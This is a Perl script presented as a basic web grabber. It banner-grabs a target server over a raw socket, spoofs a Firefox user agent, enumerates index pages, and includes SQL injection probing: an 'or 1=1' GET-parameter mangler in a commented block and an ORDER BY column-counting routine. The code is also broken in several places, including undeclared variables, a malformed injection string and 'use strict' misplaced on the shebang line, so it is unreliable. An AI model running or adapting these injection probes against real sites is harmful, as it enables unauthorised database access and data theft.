
#!/usr/bin/perl use strict;

=pod
Basic Perl Web Graber
use this command on terminal:
> perl Web_Scraping.pl 192.168.1.2 80
> perl Web_Scraping.pl example.com 80
=cut


use IO::Socket;
use LWP::UserAgent;
use LWP::Protocol::https; #in case of HTTPS
use List::Compare; #compare web pages

my $ua = LWP::UserAgent->new; # now spoof a UA:
$ua->agent ("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/4.5.10");
$ua->from('admin@cyber2labs.com'); 
$ua->timeout (18);  # setup a timeout 

my $usage = "./bg<host> <port>\n"; 
my $host = shift or die $usage;
my $port = shift or die $usage;
my $buf; # buffer for returned result
my $web= 0;     #a token for web

my $sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,
                    Proto =>"tcp") || die "Cannot connect to ".$host; 

$sock->send("HEAD / HTTP/1.1\r\n");
$sock->send("\r\n"); 
$sock->send("\r\n"); 
$sock->recv($buf, 2048);

my @buf = split("\n", $buf);

foreach (@buf){
    if (m/^Server:(.*)/){
            print "Web Server Found: ",$1,"\n";   #prints server header
            $web++;
        }
}

if ($web){ #this is a confirmed web server
    print("this is a confirmed web server");
    foreach("html","htm","php","asp","aspx", "cfn","txt","html.backup"){
        if(page("index.".$_)){
            print "Page: ","index.".$_."\n";
            foreach (@content){
                print "File: ".$2,"\n" 
                if (m/<a.*href=("|')([^"']+)("|')/);
            }
            last; # we found the page
        }
    }

}

=pod
#--------------------String SQL injection
# Uncomment these lines to try SQL injection
if ($domLine = m/error.*syntax.*sql/i) { # error returned 
        print "Positive MySQL injection: ",$url, "\n"; 
        $url = $getUrl; # reset URL
        page($url); # recall page normally
    my @origContent = @content;
        page($url); # recall page normally
        $url =~ s/(\?[^=]+=[0-9a-z_])/$1%20or%201=1/; # mangle GET 
        page ($url); # recall page with mangled GET
    my $listCompare = List::Compare->new('-u', \@content, \@origContent);
    if(scalar ($listCompare->get_unique)>0) {
        print "Positive SQL data dump: ",$url, "\n";
    }
}
=cut



sub page { #check for pages
    my $res = $ua->get("http://".$host.":".$port."/".$_[0]);
    if ($res->is_success) {
    @content = split(/\015?\012/,$res->content);
    return $_[0];
    }
    return 0;
}

#-------------------- SQL Column Counting -------------------- 
sub colCount{ # (column count, url, error boolean)
    my ($col, $url, $err) = @_;
    return if $col > 32; # 32 columns

    $injType eq "int" ? page ($url."20ORDER%20BY%20".$col."--%20"):
        page ($url. "%27%20ORDER%20BY%20".$col."--%20");

    foreach (@content) { # if we find an error:
        if (m/unknown.*column.*order/i){
            $col-=1; # we went over, go back 
            colCount ($col, $url, 1); # recursion 
            return; # must return when all completed
        }
    }
}


END {
    $sock->close()  if $sock;
}